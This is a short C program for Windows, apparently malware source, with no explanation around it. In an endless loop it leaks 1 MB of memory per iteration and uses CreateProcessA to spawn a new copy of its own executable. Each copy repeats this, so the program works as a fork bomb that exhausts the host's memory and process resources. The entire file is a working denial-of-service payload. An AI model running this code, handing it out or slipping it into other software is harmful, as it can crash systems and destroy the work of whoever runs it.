#include <stdlib.h>
#include <windows.h>

int main() {
    // determine executable path
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    while (1) {
        // leak memory
        malloc(1024 * 1024); // 1MB

        // spawn child instance
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        BOOL success = CreateProcessA(
            path,       // binary path
            NULL,       // command line
            NULL,       // proc handle not inheritable
            NULL,       // thread handle not inheritable
            FALSE,      // do not inherit handles
            0,          // no creation flags
            NULL,       // use parent proc env block
            NULL,       // use parent proc starting dir
            &si,        // pointer to STARTUPINFO structure
            &pi         // pointer to PROCESS_INFORMATION structure
        );
    }
    return 0;
}
